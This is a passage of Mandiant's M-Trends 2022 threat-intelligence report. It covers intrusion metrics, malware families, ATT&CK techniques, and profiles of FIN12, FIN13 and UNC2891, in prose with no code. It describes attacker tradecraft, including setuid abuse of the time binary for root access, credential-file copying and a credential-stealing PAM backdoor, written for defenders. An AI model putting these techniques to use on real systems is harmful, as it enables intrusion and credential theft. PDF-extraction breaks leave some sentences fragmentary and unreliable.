EXECUTIVE 
SUMMARY

SPECIAL REPORT \| MANDIANT M\-TRENDS 20224

Recent cyber events are a stark reminder that our work as defenders is never done. Critical 
vulnerabilities such as “Log4Shell” highlight the dangers of the unknown and the complexity of 
patching. The supply chain is as attractive a target as ever, providing a potential entry point into 
multiple vendors. And we must remain vigilant about protecting our industrial control systems, 
especially given that 1 in 7 multifaceted extortion attacks leak critical operational technology 
information.

Mandiant responders are on the frontlines every day, investigating and analyzing the latest 
attacks and threats, and understanding how best to respond to and mitigate them. Everything 
we learn is passed on to our customers through our various services, giving them a much\-
needed advantage in a constantly evolving threat landscape.

Every year the M\-Trends report provides some of that same critical intelligence to the greater 
security community. M\-Trends 2022 continues that tradition, offering details on the evolving 
cyber landscape, mitigation recommendations, and a wide variety of security incident\-related 
metrics. 

Let’s start with a win for defenders: the global median dwell time has continued its decline 
in 2021\. For intrusions investigated between October 1, 2020 through December 31, 2021, the 
median number of days between compromise and detection was 21 days (down from 24 days in 
2020\). Although this may demonstrate improved visibility and response, the pervasiveness of 
ransomware has helped drive this number down. 

Ransomware and multifaceted extortion continue to be concerning. We highlight an increase 
in targeting of virtualization infrastructure and offer mitigations. We also provide guidance on 
ransomware preparedness (via red teaming) and recovery operations. 

Other topics covered in M\-Trends 2022 include: 

By the Numbers The global median dwell time for intrusions identified by external third 
parties and disclosed to the victims dropped to 28 days from 73 days in 2020, a stellar 
improvement. In less desirable news, when the initial infection vector was identified, supply 
chain compromise accounted for 17% of intrusions in 2021 compared to less than 1% in 2020\. 
Other signature metrics include detection by source, industry targeting, threat groups, 
malware and attacker techniques. 

Recently Graduated Threat Groups A detailed analysis of two financially motivated groups 
we graduated in 2021: FIN12 and FIN13\. We also highlight two noteworthy uncategorized 
groups: UNC2891 and UNC1151\. 

Microsoft Exchange Case Study Our observations responding to more than 20 incidents 
involving exploitation of on\-premises Microsoft Exchange servers. In one testament to 
dedicated investigation and analysis, the deployment of cryptocurrency coinminers by one 
financially\-motivated threat group led to the discovery of two nation\-state actors in the same 
environments. 

China Cyber Operations We review China’s realignment and retooling, explore reemerging 
espionage activity and highlight actors such as APT10 and APT41\. 

Misconfiguration Mitigations We observed various compromises due to misconfigurations 
when using on\-premises Active Directory with Azure Active Directory to achieve a single 
integrated identity solution. 

M\-Trends 2022 builds on our transparency to continue providing critical knowledge to those 
tasked with defending organizations. The information in this report has been sanitized to 
protect identities of victims and their data.

DATA FROM MANDIANT 
INVESTIGATIONS

The metrics reported in M\-Trends 2022 are based on 
Mandiant investigations of targeted attack activity 
conducted between October 1, 2020 and December 31, 2021\. 

This edition of M\-Trends covers a 15\-month period 
compared to a 12\-month period in previous editions.

Detection by Source

Across the board, there was an increase in external notification of intrusions in 
2021 compared to 2020\. However, awareness of most intrusions continues to 
come about through internal detections. The percentage of intrusions detected 
internally has maintained a gradual upwards trend with moderate fluctuation over 
the last six years.

Internal detection
is when an organization 
independently discovers 
it has been compromised.

External notification 
is when an outside entity 
informs an organization it 
has been compromised. 
This includes when a 
compromised organization 
is first notified of an incident 
by an attacker via an 
extortion note.

Detection by Source by 
Region, 2017–2021

In Americas, organizations detected intrusions internally in 60% of cases in 
2021 compared to 61% of cases in 2020\. There is relative stability in detection by 
source trends for Americas from 2017 to 2021\. 

Organizations in APAC were notified by an external entity in 76% of intrusions in 
2021 compared to 48% of intrusions in 2020\. Observations for 2021 are in line with 
observations for APAC from 2019\. Mandiant experts have seen relatively large 
shifts in detection by source metrics for APAC over the past five years. 

In EMEA, organizations were notified of an incident by an external entity in 62% 
of intrusions in 2021 compared to 47% of intrusions in 2020\. Similar to APAC, when 
analyzing the five\-year trend, there remains variability in detection by source in 
EMEA. The variability observed for both APAC and EMEA can be explained in part 
by continued maturity of organizations’ security programs as well as external 
entities’ notification ability in these regions.

Dwell time is calculated as the 
number of days an attacker is 
present in a victim environment 
before they are detected. The 
median represents a value 
at the midpoint of a data set 
sorted by magnitude.

Dwell Time 

The global median dwell time continued to improve in 2021 with organizations now 
detecting intrusions in three weeks. The global median dwell time for organizations 
that learned about their security incident through an external third party notification 
improved markedly in 2021\. Not only are external entities doing more notifications 
of intrusions to organizations compared to 2020, they are also notifying them 
more quickly, resulting in shorter dwell times. The median dwell time for internally 
detected intrusions lengthened in 2021 compared to 2020 but remained shorter than 
median dwell time for external notifications.

Global Dwell Time

The global median dwell time for 2021 was 21 days compared to 24 days in 2020\. This 
13% improvement in global median dwell time was comprised of noteworthy changes 
in relation to source of detection. The global median dwell time for incidents which 
were identified externally dropped from 73 to 28 days. Conversely, incidents which 
were identified internally saw a lengthening of global median dwell time from 
12 to 18 days. 

There were significant improvements to global median dwell time when an external 
entity was the notification source. External entities are now detecting intrusions 
and notifying organizations in less than a month—62% faster compared to 2020\. This 
speaks to improved detection capabilities of external entities in addition to more 
established communications and outreach programs. 

Mandiant experts observed a 50% increase in global median dwell time for internally 
detected intrusions. The global median dwell time for internally detected intrusions 
rose from 12 days in 2020 to 18 days in 2021\. While median dwell time for internal 
detections was slower compared to 2020, internal detections were still 36% faster 
than external notifications.

Global Dwell Time Distribution

Global dwell time distribution continues to improve at both ends of the spectrum. 
In 2021, 55% of investigations had dwell times of 30 days or fewer with 67% of these 
(37% of total intrusions) being discovered in one week or less. 

Mandiant experts observed a spike in dwell times between 90 and 300 days with 
20% of investigations falling into this range. This could indicate intrusions going 
undetected until more impactful actions occur in the environment following initial 
infection and reconnaissance phases of the targeted attack lifecycle. This may also 
highlight a disparity between organizational detection capabilities and the types of 
attacks organizations face. 

Fewer intrusions are going undetected for extensive periods of time. Only 8% of 
intrusions investigated in 2021 had a dwell time of more than a year and half of these 
(4% of total intrusions) had dwell times greater than 700 days.

Investigations involving Ransomware

Mandiant experts observed that the percentage of intrusions involving multifaceted 
extortion and ransomware was relatively stable from 2020 to 2021\. In 2021, 23% of 
intrusions involved ransomware compared to 25% in 2020\. These types of attacks 
continue to be a driving force of reduced median dwell times. Ransomware\-
related intrusions had a median dwell time of 5 days compared to 36 days for non\-
ransomware intrusions, making dwell times for ransomware intrusions one\-seventh 
the duration of non\-ransomware. While median dwell time for ransomware\-related 
intrusions in 2021 remained the same as 2020, Mandiant experts noted a 20% 
reduction in median dwell time for non\-ransomware intrusions year over year.

The median dwell time for intrusions investigated in Americas remained constant at

9\-percentage point increase in median dwell time for intrusions detected internally, 
increasing from 9 days in 2020 to 18 days in 2021\. While median dwell time for internal 
detection did lengthen in 2021 compared to 2020, the six\-year trend continues 
towards faster internal detections. Americas median dwell time for internal 
detections in 2020 demonstrated a major improvement, making it unsurprising this 
metric reverted some in 2021\. 

Intrusions with an external notification source had a median dwell time of 49 days 
in 2020 compared to only 15 days in 2021\. External entities notified organizations in 
Americas 69% faster in 2021 compared to 2020\.

The dwell time distribution for APAC reveals 60% of intrusions had dwell times 
of 30 days or fewer with 60% of these (36% of all APAC intrusions) detected in 
one week or less. At the other end of the spectrum, similar to observations from 
previous years, dwell time distribution in APAC continues to show that several 
intrusions go undetected for extended periods of time. Mandiant experts observed 
that 13% of intrusions in APAC in 2021 had dwell times that exceeded three years. 
Organizations in APAC have impressive detection capabilities. However, intrusions 
that go undetected initially can remain undetected, resulting in extensive dwell 
times when they are ultimately detected.

Targeted Attacks

Initial Infection Vector

Exploits remained the most frequently identified initial infection vector in 2021\. 
In intrusions where the initial infector vector was identified, 37% started with an 
exploit—an 8\-percentage point increase over 2020\.

Supply chain compromise was the second most prevalent initial infection vector 
identified in 2021\. When the initial infection vector was identified, supply chain 
compromise accounted for 17% of intrusions in 2021 compared to less than 1% in 
2020\. Further, 86% of supply chain compromise intrusions in 2021 were related to 
the SolarWinds breach and SUNBURST.¹ 

In 2021, Mandiant experts observed an uptick in intrusions with an initial infection 
vector due to a prior compromise. These intrusions include handoffs from one group 
to another and prior malware infections. Prior compromises accounted for 14% of 
intrusions where the initial infection vector was identified. 

Mandiant experts observed far fewer intrusions initiated via phishing in 2021\. 
When the initial compromise was identified, phishing was the vector in only 11% of 
intrusions in 2021 compared to 23% in 2020\. This speaks to organizations’ ability 
to better detect and block phishing emails as well as enhanced security training of 
employees to recognize and report phishing attempts.

Data Theft

Financially motivated intrusions continue to be a mainstay in 2021, with 
adversaries seeking monetary gain in 3 out of 10 intrusions through 
methods such as extortion, ransom, payment card theft and illicit 
transfers. The percentage of financially motivated intrusions dropped 
to 30% in 2021 compared to the 38% of intrusions observed in 2020\. 
Mandiant experts observed a 2\-percentage point decrease specifically in 
ransomware\-related incidents in 2021\. Another likely contributing factor 
for decreased financial gain operations in 2021 was an increase in law 
enforcement action taken against financially motivated actors leading to 
arrests, takedown of servers and seizure of extorted funds.

Involved Exploits

Threat actors continue to prioritize data theft as a primary mission

32% of intrusions involving data theft (9% of all intrusions) the stolen data 
was specifically targeted for use as the threat actor’s leverage during 
negotiations for payment. In 12% of intrusions involving data theft (4% 
of all intrusions) the data theft likely supported intellectual property or 
espionage end goals.

Compromised Architecture and Insider Threat

In 2021 Mandiant experts observed a slight uptick in compromises that 
likely served only to compromise architecture for further attacks. In 
2021, this activity was identified in 4% of intrusions, a 1\-percentage point 
increase compared to 2020\. Likewise, insider threat continues to be rare 
with only 1% of intrusions investigated by Mandiant related to insider 
threat. These metrics have remained relatively stable over years of 
reporting.

Malware

Mandiant continuously expands its body of knowledge on malware based on insights 
gained from the frontlines of cyber incidents, public reporting and various other 
research avenues. In 2021, Mandiant began tracking over 700 new malware families. 
This number continues to grow in line with previous trends with no indication of 
slowing down. 

In 2021, Mandiant experts observed adversaries use 365 distinct malware families 
during investigations of compromised environments. This number continues to grow 
in line with the number of observed malware families compared to previous years. Of 
the 365 malware families observed by Mandiant experts during intrusions, 154 were 
malware families which Mandiant began tracking in 2021\. 

A malware family is a program or set 
of associated programs with sufficient 
“code overlap” among the members that 
Mandiant considers them to be the same 
thing, a “family”. The term family broadens 
the scope of a single piece of malware 
as it can be altered over time, which in 
turn creates new, but fundamentally 
overlapping pieces of malware.

backdoors (40%), droppers (12%), ransomware (10%), downloaders (7%), credential 
stealers (5%) and launchers (4%). 

Similar to newly tracked malware families, 22% of observed malware families in 2021 
were comprised of the "other" malware family category. Compared to previous years, 
this number remains stable as adversaries create and use a variety of different tools 
to achieve their missions.

Mandiant observed a rise in the variety of ransomware malware families used by

Most Frequently Seen Malware Families

The malware families seen most frequently during intrusions investigated by 
Mandiant experts were BEACON, SUNBURST, METASPLOIT, SYSTEMBC, LOCKBIT 
and RYUK. BEACON was once again the most prevalent malware family observed 
in 2021—three times more often than the second most frequently seen malware 
family. Further, use of BEACON across intrusions increased from 24% of intrusions 
in 2020 to 28% in 2021\. BEACON remains by far the favorite malware family among 
adversaries and Mandiant expects its use will likely increase in the years to come.

SUNBURST¹² was observed in 9% of all intrusions investigated by Mandiant in 2021\. 
SUNBURST was delivered at scale to victim environments across the globe through a 
malicious update, resulting in widespread compromised access. This metric is in line 
with the observed relationship between the second most prevalent initial infection 
vector, supply chain compromises and the use of SUNBURST in intrusions.

intrusions seen throughout 2021\. Ransomware families continue to contribute to the 
malware family collection every year. 

Adversaries continue to use a variety of malware to carry out missions. In 2021, 
Mandiant observed just 3\.8% of malware families being used in 10 or more intrusions 
while 81% of malware families were observed in only one or two intrusions. Over 
the years, Mandiant has observed adversary toolsets become more diverse 
as adversaries continue to evolve. This diversification is demonstrated by a 
continuation of limited retooling across intrusions.

Malware Definitions

BEACON is a backdoor that is commercially available as part of the Cobalt Strike 
software platform and commonly used for penetration testing network environments. 
The malware supports several capabilities, such as injecting and executing arbitrary 
code, uploading and downloading files and executing shell commands. Mandiant has 
seen BEACON used by a wide range of named threat groups including APT19, APT32, 
APT40, APT41, FIN6, FIN7, FIN9, FIN11, FIN12 and FIN13, as well as nearly 650 UNC 
groups.

SUNBURST is a .NET\-based backdoor that initially communicates via DNS. SUNBURST 
generates the domain of the initial remote server using a domain generation 
algorithm. The DNS response returns a CNAME record containing the domain of the C2 
server used for subsequent communication via HTTP. Supported backdoor commands 
include file download and execution, file management, registry manipulation, and 
process termination. SUNBURST can also disable targeted services to avoid detection 
and upload basic system information that includes the system’s IP address, DHCP 
configuration, and domain information. Mandiant has observed UNC2452 leverage 
SUNBURST.¹⁴ 

METASPLOIT is a penetration testing platform that enables users to find, exploit, and 
validate vulnerabilities. Mandiant has seen METASPLOIT used by APT40, APT41, FIN6, 
FIN7, FIN11, FIN12, FIN13 and 40 UNC groups with end goals ranging from espionage 
and financial gain to penetration testing.

SYSTEMBC is a tunneler written in C that retrieves proxy\-related commands from a 
C2 server using a custom binary protocol over TCP. A C2 server directs SYSTEMBC 
to act as a proxy between the C2 server and a remote system. SYSTEMBC is also 
capable of retrieving additional payloads via HTTP. Some variants may use the Tor 
network for this purpose. Downloaded payloads may be written to disk or mapped 
directly into memory prior to execution. SYSTEMBC is often used to hide network 
traffic associated with other malware families. Observed families include DANABOT, 
SMOKELOADER, and URSNIF. Mandiant has seen SYSTEMBC used by FIN12 and as 
many as 10 UNC groups with goals related to financial gain.

LOCKBIT is ransomware written in C that encrypts files stored locally and on network 
shares. LOCKBIT can also identify additional systems on a network and propagate 
via SMB. Prior to encrypting files, LOCKBIT clears event logs, deletes volume shadow 
copies and terminates processes and services that may impact its ability to encrypt 
files. LOCKBIT has been observed using the file extension “.lockbit” for encrypted 
files. Mandiant as seen LOCKBIT used by more than 10 UNC groups with goals relating 
to financial gain and espionage.

RYUK is ransomware written in C that encrypts files stored on local drives and 
network shares. It also deletes backup files and volume shadow copies. Some RYUK 
variants can propagate to other systems on a network. Mandiant has seen RYUK used 
by FIN6, FIN12 and 10 financially motivated UNC groups.

Operating System Effectiveness

Previous trends in operation system effectiveness continued in 2021 as newly 
tracked as well as observed malware families were predominately effective on 
Windows. However, malware families impacting Linux became more prevalent in 
2021\. Newly tracked malware families effective on Linux increased to 11% in 2021 
compared to 8% in 2020\. Further, observed malware families effective on Linux 
increased to 18% in 2021 from 13% in 2020\. The increase in effectiveness on Linux 
in both newly tracked and observed malware families shows adversaries’ ability 
and willingness to develop and target different operating system environments. 
In intrusions investigated by Mandiant, adversaries continue to target operating 
systems with the same relative attention.

The operating system 
effectiveness of a malware 
family is the operating 
system(s) that the malware 
can be used against.

MITRE ATT\&CK® is a globally\-
accessible knowledge base of 
adversary tactics and techniques 
based on real\-world observations. 
The ATT\&CK knowledge base 
is used as a foundation for the 
development of specific threat 
models and methodologies in the 
private sector, government and 
the cyber security product and 
service community.

Threat Techniques

Mandiant remains committed to supporting community and industry efforts by 
mapping its findings to the MITRE ATT\&CK framework. In 2021, MITRE released 
versions 9 and 10 of ATT\&CK, which focused on advancement of MITRE’s coverage of 
Linux, macOS and container techniques. Mandiant mapped 300\+ additional Mandiant 
techniques to the MITRE ATT\&CK framework in 2021, bringing the total to 2100\+ 
Mandiant techniques and subsequent findings associated with MITRE ATT\&CK. 

Organizations must prioritize which security measures to implement and the 
likelihood of specific techniques being used during an intrusion should impact this 
decision\-making process. Examining the prevalence of technique usage during 
recent intrusions, can better equip organizations to make intelligent security 
decisions. 

Mandiant experts observed adversaries use 70% of MITRE ATT\&CK techniques 
and 46% of sub\-techniques during an intrusion in 2021\. Compared to 2020, this 
represents an 11% increase in techniques observed and a 92% increase in sub\-
techniques observed. While this is representative of adversaries using a wider 
variety of techniques to further intrusions, Mandiant experts believe this increase 
is due in part to more robust classification and systematic categorization of threat 
data that was implemented in 2021\. 

In 2021, 43% of techniques observed (30% of all techniques) were seen in more 
than 5% of intrusions compared to 37% of techniques observed in 2020 (23% of all 
techniques in 2020\). Mandiant experts recommend prioritizing implementation of 
security measures to protect against the most commonly used techniques over 
techniques with a lower prevalence.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202231

In 2021, Mandiant observed that more than half of the intrusions used obfuscation, 
such as encryption or encoding, on files or information to make detection and 
subsequent analysis more difficult (T1027\). 

Adversaries also continue to use a command or scripting interpreter to further 
intrusions (T1059\) and 65% of those cases (29% of all intrusions) involved the use of 
PowerShell (T1059\.001\). 

In 37% of investigations the adversary communicated using application layer 
protocols (T1071\) with 87% of those (32% of all investigations) specifically using web 
protocols such as HTTP and HTTPS. 

Mandiant experts observed adversaries perform discovery actions for system 
information (T1082\) in 32% of investigations and file or directory information 
(T1083\) also in 32% of investigations. Similarly, in 32% of investigations adversaries 
removed indicators on a host (T1070\) with 85% of these (27% of all investigations) 
involving file deletions. 

Similar to 2020, adversaries demonstrated a willingness to take advantage of 
what is available in a victim’s environment to further intrusions in 2021\. This is 
particularly evident in how frequently adversaries used web protocols, PowerShell, 
system services and Remote Desktop. Organizations must balance convenience 
and accessibility of common technologies with security of environments.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202244

HOW A THREAT CLUSTER 
BECOMES AN APT OR 
FIN GROUP 

Mandiant analysts review threat activity data from a variety of sources to identify 
noteworthy clusters — such as Mandiant incident response engagements, Managed 
Defense investigations, and security product telemetry. Initially, Mandiant reporting 
may refer to these small clusters of activity by a generic description, such as 
“Suspected Iranian espionage actors,” instead of a formal name. Over time, some 
clusters will expand based on data obtained from emerging threat activity or 
ongoing research that provides insight into the cluster’s tactics, techniques and 
procedures (TTPs). When there is insufficient evidence to attribute the activity to 
an existing threat actor or group immediately, Mandiant creates an uncategorized 
(UNC) threat cluster to track the newly identified activity. 

An UNC is a cluster of cyber activity that includes observable artifacts such as 
adversary infrastructure, tools, and tradecraft. UNCs are based on a defining, 
anchoring characteristic often discovered during a single incident. For example, a 
common anchor would be a malware sample that connects to an actor\-controlled 
domain. While Mandiant reporting typically references specific UNCs, older articles 
may use a temporary group name such as “TEMP.Reaper”.

As our knowledge of a threat cluster becomes sufficiently mature, we may conduct 
a methodical, in\-depth research project that culminates in assigning a formal 
designation based on established Mandiant naming conventions. Advanced 
persistent threat (APT) groups are generally focused on espionage activities 
whereas financially motivated (FIN) groups are comprised of criminal actors that 
monetize their operations via methods such as ransomware deployment, payment 
card data theft and business email fraud. 

In 2021, Mandiant promoted two attack groups from a previously tracked TEMP 
group to FIN groups. We also announced a new UNC group of significant interest.

FIN12 PRIORITIZES 
SPEED TO DEPLOY 
RANSOMWARE AGAINST 
HIGH\-VALUE TARGETS 

FIN12 is a financially motivated threat group behind prolific RYUK ransomware 
attacks dating to at least October 2018\. Mandiant’s definition of FIN12 is limited to 
post\-compromise activity because we have high confidence FIN12 relies on partners 
to obtain initial access to victim environments. Instead of conducting data theft and 
extortion, a tactic widely adopted by other ransomware threat actors, FIN12 appears 
to prioritize speed. The lack of large\-scale data exfiltration in FIN12 incidents has 
almost certainly contributed to the group’s high cadence of operations. Between 
September 2020 and September 2021, FIN12 intrusions comprised nearly 20 percent 
of the ransomware incident response investigations performed by Mandiant. 

Partnerships for Initial Access

While FIN12 appears to rely on close partnerships for obtaining initial access to 
organizations, the group almost certainly has some input into victim selection. FIN12 
has largely targeted high\-revenue organizations. Unlike other ransomware threat 
actors, the group has frequently targeted organizations in the healthcare sector. 
While FIN12 has overwhelmingly targeted organizations located in North America, 
evidence shows regional targeting expanding. 

Historically, FIN12 has maintained a close partnership with TRICKBOT\-affiliated 
threat actors. All incidents involving FIN12 prior to March 2020 leveraged accesses 
obtained from TRICKBOT infections. However, following a break in activity from 
late March 2020 to late August 2020, FIN12 seemingly diversified its partnerships, 
possibly seeking out other threat actors’ tools and services to increase the volume 
and efficiency of their attacks. In September 2020, FIN12 shifted to accesses 
obtained via BAZARLOADER infections Mandiant tracks as UNC2053\. Mandiant 
has observed numerous overlaps between UNC2053 and TRICKBOT operations, 
including the use of common infrastructure, code signing certificates, droppers 
and distributions TTPs. Mandiant believes BAZARLOADER and TRICKBOT were likely 
developed under the direction of common threat actors.

In at least four FIN12 intrusions between February and April 2021, evidence 
revealed malicious access to the targeted organization’s Citrix environment. 
While investigations did not confirm how FIN12 obtained legitimate credentials 
to the environment, it is plausible the threat actors relied on purchases from 
underground forums. 

In two separate FIN12 intrusions during May 2021, a threat actor obtained a foothold 
in environments through malicious email campaigns distributed internally from 
compromised user accounts. In both incidents, the threat actor used compromised 
credentials to access the targeted organization’s Microsoft 365 environment. While 
the distribution TTPs varied, both campaigns led to WEIRDLOOP and BEACON 
payloads attributed to FIN12\. 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202246

Increased Speed of Attacks

After acquiring access to victim environments, FIN12 deploys ransomware quickly. 
In M\-Trends 2021, the median dwell time for all ransomware investigations was five 
days, whereas, across FIN12 engagements, dwell time was less than two days. 
Mandiant has observed a significant year\-over\-year decrease in the amount of time 
between initial access and the deployment of ransomware by FIN12\. Most of the 
RYUK incidents Mandiant has responded to are attributed to FIN12, but we assess 
the ransomware is not exclusive to the group. FIN12 has almost exclusively deployed 
RYUK ransomware. However, in one instance, FIN12 deployed CONTI ransomware 
and extorted the organization under threat of releasing stolen data.

Mandiant has observed FIN12 use a broad toolset that included the Powershell\-based 
EMPIRE framework and the TRICKBOT banking Trojan. However, since February 
2020, FIN12 has used Cobalt Strike BEACON payloads in nearly every one of its 
intrusions, from internal reconnaissance to ransomware deployment. 

Regional Expansion of Attacks

Mandiant expects that FIN12’s regional targeting will continue to broaden. There 
has been significant attention from the U.S. government on ransomware threats 
in 2021\. Various efforts have been made to curtail the threat, including sanctions 
and the threat of future sanctions against threat actors deploying ransomware and 
services used by these actors to facilitate financial transactions. The elevated level 
of negative attention may make U.S.\-based organizations a less desirable target 
for FIN12, which means it may shift its attention to organizations operating in other 
areas of the world, including nations in Western Europe and the Asia\-Pacific region.

FIN13 PRIORITIZES TARGETS 
BASED IN MEXICO 

Active since at least 2016, FIN13 is a financially motivated threat group that targets 
organizations based in Mexico. The group has monetized its intrusions by collecting 
information required to conduct fraudulent financial transfers. Mandiant believes 
FIN13 has gained access to victim organizations by exploiting vulnerabilities in 
public\-facing web servers and popular tools and malware that are at least partially 
based on publicly available code. However, the threat group has also demonstrated 
the capability to deploy small custom tools and utilities crafted to support specific 
objectives in targeted environments. FIN13 is further characterized by its extensive 
use of web shells and other passive backdoors across various stages of the attack 
lifecycle. 

Extended Dwell Times and Evolving TTPs

Unlike many financially motivated threat actors tracked by Mandiant, FIN13 has 
often maintained presence in victim environments for durations up to several years. 
Due to this extended access, Mandiant has been able to observe the group’s TTPs 
evolve over time, even within individual environments. Notable changes in TTPs have 
included a shift from the near\-exclusive use of traditional web shells to BLUEAGAVE, 
a PowerShell or Perl\-based passive backdoor. FIN13 has also made regular updates 
to the file encoding used to obfuscate not only their tools, scripts and malware but 
also the data they steal. 

Unique Monetization Strategy

FIN13 monetizes its operations with schemes directly enabled via data theft. The 
group often steals financial data or files related to a company’s point\-of\-sale (POS) 
systems, ATMs and general financial transaction processing systems. FIN13 also 
appears to adapt its end\-stage operations to each victim’s unique environment. 
In at least one incident, the threat actors deployed custom malware that Mandiant 
tracks as GASCAN, which processes POS card and transaction data structured in a 
format likely used to generate fraudulent financial transactions. FIN13 intrusions 
targeting retailers have sometimes led to the theft of payment card data, but rather 
than collect this data to sell on underground markets, evidence suggests it has been 
used to generate fraudulent transfers of funds into attacker\-controlled accounts. 
This approach is relatively unique; many actors who target POS systems focus their 
operations on obtaining and selling credit card data. 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202248

The highly localized 
targeting of Mexico 
by FIN13 is atypical of 
financially motivated 
actors who are more 
broadly opportunistic.

Geographically Focused on Targets in Mexico 

Mandiant has not confirmed the geographic origin of the actors behind FIN13 
operations; however, strings contained within the malware and its exclusive 
targeting of organizations based in Mexico suggest at least some of the group is 
fluent in Spanish. For example, many of the publicly available tools and web shells 
used by FIN13 have been modified to contain Spanish\-language code elements. 

The highly localized targeting of Mexico by FIN13 is atypical of financially motivated 
actors who are more broadly opportunistic. However, regional targeting has 
been historically more common within Latin American cyber crime communities. 
For example, Mandiant has previously reported on Brazilian threat actors who 
historically focused on targeting Brazil\-based individuals and organizations. We 
began to observe a significant expansion in that group’s targeting beginning in 2018, 
which was likely due to its increasing sophistication and developing relationships 
with other cyber criminals. It is plausible that FIN13 operations will follow a similar 
pattern. As the threat actor’s tradecraft improves and organizations based in 
Mexico develop more mature security programs, it is likely FIN13 will begin to target 
organizations in other parts of the world.

GRASPING THE 
COMPLEXITY OF UNC2891

In 2021, Mandiant responded to a series of incidents that targeted financial 
organizations in the Asia Pacific region. During these investigations, Mandiant 
identified a threat group that demonstrated unusual skillsets. This group, which 
Mandiant tracks internally as UNC2891, possesses a fluency and expertise in 
targeting Unix and Linux based systems for objectives which appear to be financially 
motivated. UNC2891 maintains an arsenal of malware and tooling to move through 
environments easily and limit forensic evidence trails on impacted endpoints. 
Overall, UNC2891 demonstrates the attributes of a skilled adversary with the ability 
to gain a deep understanding of the systems they target and make extensive use 
of publicly available tools which they customize, compile and package for different 
operating systems. Similarly, Mandiant has observed evidence to indicate UNC2891 
has a complex understanding of operational security and applied several techniques 
to hide their presence and hinder response efforts.

SUN4ME

Mandiant identified evidence that UNC2891 used an expansive attacker toolkit called 
SUN4ME. SUN4ME is a self\-contained ELF binary with over a hundred commands 
that aid the operator in all stages of the attack lifecycle. SUN4ME capabilities 
support network reconnaissance, host enumeration, exploitation of common 
vulnerabilities and anti\-forensics measures, along with common shell utilities. The 
exact origins of SUN4ME are not well understood. However, based on investigations 
where UNC2891 was identified, SUN4ME capabilities were a primary enabler for that 
actor’s operations. The compiled nature of SUN4ME combined with its extensive 
set of supported functions provided UNC2891 with both flexibile deployment and 
consistent performance. Where production environments might restrict foreign 
package installations or alert network defenders to their presence, a compiled 
binary could be moved from endpoint to endpoint with relative ease. UNC2891 could 
depend on SUN4ME’s broad set of tools without worrying about dependency issues 
commonly experienced across disparate sets of Linux and Unix\-based operating 
systems. 

Several of the commands in SUN4ME are publicly available tools or scripts also 
present in various offensive distributions or frameworks. However, Mandiant 
identified custom tooling built into SUN4ME, including exploits for remote code 
execution vulnerabilities in Oracle WebLogic and Veritas NetBackup software. 
SUN4ME also includes a demo command that contains sixteen different ASCII 
terminal animations along with extensive help dialogs for supported features. The 
help dialogs are provided in fluent English, suggesting the developer may be English 
speaking. 

UNC2891 used sshock, an SSH brute forcing tool bundled within SUNME, as a means 
of initial access into the environments of targeted organizations. The sshock tool 
supports the use of wordlist credentials, parallel scanning of targets and the ability 
to collect SSH keys from targeted systems after gaining access to them. These 
features enabled UNC2891 to run commands as well as upload, run, and delete files 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202250

automatically after a system was compromised. Mandiant identified evidence to 
indicate UNC2891 performed reconnaissance in compromised environments to 
supplement the embedded credential lists provided with sshock. The automated 
nature of some sshock features helped the attacker spread through an environment. 
After UNC2891 successfully compromised an environment, SUN4ME and sshock 
facilitated movement through the targeted environment by deploying additional 
malware and backdoors.

STEEL Family of In\-Memory Droppers

In every case where Mandiant recovered variants of SUN4ME, it had been loaded 
through an in\-memory dropper Mandiant tracks as STEELCORGI. While in\-memory 
droppers are not terribly unique even in Unix and Linux\-based environments, 
STEELCORGI used techniques that were apparently designed to limit both detection 
and broad\-scale identification of how it operated. STEELCORGI droppers decrypt 
an embedded payload based on a configurable behavior flag and environment 
variables obtained at runtime but also take steps to obfuscate the environment 
variables they would access. During investigations where active malware that 
leverages environment variables is suspected, analysts usually identify the source 
environment variable and enumerate the instances of that environment variable 
within the network. The presence of the environment variable effectively acts as an 
indicator of compromise and allows analysts to narrow down suspect endpoints and 
prioritize them for deep dive analysis. STEELCORGI was designed to frustrate these 
efforts by enumerating environment variables by the SHA256 hash of the variable 
name, limiting the ability to identify the environment variable from malware analysis 
alone. Without the specific key used by STEELCORGI, decryption of the payloads was 
impossible.

While some variants of STEELCORGI frustrated analysis and detection efforts, a 
more recent sample of STEELCORGI presented avenues for decryption of payloads. 
One sample derived the decryption key from multiple pieces of information culled 
from the target endpoint. When an endpoint or its hardware information was 
available, Mandiant was able to decrypt payloads embedded within these versions of 
STEELCORGI. Mandiant has also observed UNC2891 use an in\-memory dropper with 
functionality similar to STEELCORGI, except that it enumerates keys through an MD5 
hash of environment variables and includes the functionality to create new versions 
of itself with different payloads. Mandiant tracks this variant as STEELHOUND.

Notable Tactics, Techniques and Procedures

Soon after gaining root\-level access to a targeted endpoint, UNC2891 would set 
the setuid and setgid bits on legitimate executables owned by root. The setuid and 
setgid bits allow a non\-privileged user to run the file under the context of the owner; 
in this case root. This allowed UNC2891 to maintain root\-level command access on 
a system without needing to elevate permissions or impersonate a privileged user. 
A common example observed by Mandiant during investigations into UNC2891 was 
to set the setuid and setgid bits on the Unix time program. This allowed UNC2891 to 
proxy commands as an argument to time resulting in the commands being executed 
as the root user.

During lateral movement and internal reconnaissance activity, UNC2891 often used 
an extensive shell script that performed network and endpoint reconnaissance, 
including the collection of running processes, session information and SSH known 
hosts and keys. It also made copies of credential files such as /etc/shadow and /etc/
passwd. UNC2891 would often create a new directory to stage the output of these 
scripts; the attacker would then compress and encode them using a uuencoding 
scheme. While uuencode is an uncommon encoding scheme for attackers, UNC2891 
used it extensively along with a set of Perl scripts (bundled in SUN4ME) to facilitate 
the encoding and decoding of files.

In most cases, UNC2891 would immediately install a backdoor that Mandiant 
tracks as SLAPSTICK on compromised endpoints. SLAPSTICK is a Linux Pluggable 
Authentication Module (PAM) based backdoor that provides access to a system with 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202252

a hardcoded password. During installation, the original Linux PAM authentication 
module is renamed and the malicious SLAPSTICK module takes its place, effectively 
hooking the PAM authentication process. This also allows SLAPSTICK to capture 
plaintext credentials of user logins which it subsequently writes to an encrypted 
file on disk. Variants of SLAPSTICK support basic commands, such as the ability 
remove itself from an endpoint, create outbound connections or spawn a shell with 
the HISTFILE unset. SLAPSTICK’s ability to provide stealthy backdoor access to 
endpoints along with credential harvesting functionality drove much of the lateral 
movement observed for UNC2891 and remained a primary way for the attacker to 
